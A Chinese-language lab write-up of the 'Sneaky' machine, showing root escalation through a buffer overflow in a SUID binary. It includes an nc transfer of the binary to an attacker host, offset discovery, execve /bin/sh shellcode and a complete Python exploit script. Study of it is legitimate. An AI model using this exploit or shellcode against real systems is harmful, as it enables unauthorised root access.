Sneaky（suid+缓冲区溢出提权）
===

上一篇：[Sneaky(snmp默认口令泄露敏感信息)](https://whale3070.github.io/training/2019/10/26/07-x/)
参考资料：
- [缓冲区溢出案例（一）](https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/)
- [ippsec youtube video](https://www.youtube.com/watch?v=1UGxjqTnuyo)

>名词解释
函数返回地址：保存当前函数调用前的信息，一边函数返回时能够回复到函数被调用前的代码区中继续执行指令。
EIP: 指令寄存器，指向下一条等待执行的指令地址。

## 找到suid权限的程序 
```
find / -perm -4000 2>/dev/null > examSUID.txt
```
## 让该程序报错，证明可能有bof漏洞
`python -c "print 'A'*500"`

![1]($res/1.PNG)

```
/usr/local/bin/chal $(python -c "print 'A'*500") 
Segmentation fault (core dumped)
```
##  nc下载程序到本地进行分析 
【kali运行】`nc -lnvp 8000 > chal`
【目标shell运行】`nc 10.10.14.8 8000 < /usr/local/bin/chal`

## 定位缓冲区长度为362字节

** 生成500字节字符串**
```
locate pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```
**gdb调试该程序**

[gdb用法](https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html)
```
gdb -q chal
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```
![2]($res/2.PNG)


得到一个地址0x316d4130


```
locate pattern_offset.rb
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 500 -q 316d4130
```
![3]($res/3.PNG)

offset 362， 现在我们知道了第362就是要覆盖的返回地址。

## 搜索shellcode

【目标shell运行】uname -a
```
Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux
```
搜索i686，可得知目标机器是86位的机器。

google搜索关键词"  packetstorm /bin/sh shellcode  "
```
char shellcode[] = 
"\x31\xc0\x50\x68\x2f\x2f\x73"                   
"\x68\x68\x2f\x62\x69\x6e\x89"                   
"\xe3\x89\xc1\x89\xc2\xb0\x0b"                   
"\xcd\x80\x31\xc0\x40\xcd\x80";
```
## gdb调试选择溢出后的返回地址

gdb /usr/local/bin/chal

run $(python -c 'print "A"*500')    #这个数字500可以随意设置，但不能小于362，否则不会造成溢出错误；也不能太大，不方便分析。

x/500x $esp      这条命令的意思是，**查看栈指针寄存器ESP**，500字节的内容，每次输出100字节，按enter键查看下一个100字节内容，分为5次输出

字符串A，转换为十六进制就是\x41

![5]($res/5.PNG)

先随便找一个地址是\x41的地址，比如说0xbffff820

eip = pack('<L', 0xbffff820)

这一步的作用是，写一个exp的demo。注意此时的eip是错误的，当我们写好demo以后，就可以使用`python exp.py`来进行后续调试了。

## exp demo
```
from struct import pack

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"  #shellcode是c语言二进制代码，
shellcode +="\x68\x68\x2f\x62\x69\x6e\x89"  #作用是将/bin/sh调出
shellcode +="\xe3\x89\xc1\x89\xc2\xb0\x0b"  #因为程序是suid权限，
shellcode +="\xcd\x80\x31\xc0\x40\xcd\x80"  #所以运行后调出/bin/sh就是root权限的shell

buffersize = 362       #缓冲区长度是362，之前说过如何计算得出

nop = "\x90" * (buffersize - len(shellcode))  #缓冲区长度减去shellcode的长度，其余部分用\x90填充
eip = pack('<L', 0xbffff820)            #eip指向返回地址，在溢出完成后，使得指令继续正常向后运行
payload = nop + shellcode + eip

print payload
```
gdb /usr/local/bin/chal

run $(python exp.py)

调试exp demo
![7]($res/7.PNG)

run $(python exp.py)

x/400x $esp  这条命令的意思是，**查看栈指针寄存器ESP**，400字节的内容，每次输出100字节，按enter键查看下一个100字节内容，分为4次输出

因为exp上写了除了shellcode部分，其余部分用\x90填充

所以找到一个随便找一个内容是\x90的地址0xbffff7c0
修改exp的这一行：`eip = pack('<L', 0xbffff7c0) `

运行exp即可得到root权限：`/usr/local/bin/chal $(python exp.py)`

![8]($res/8.PNG)

## 执行流程

![10]($res/10.png)



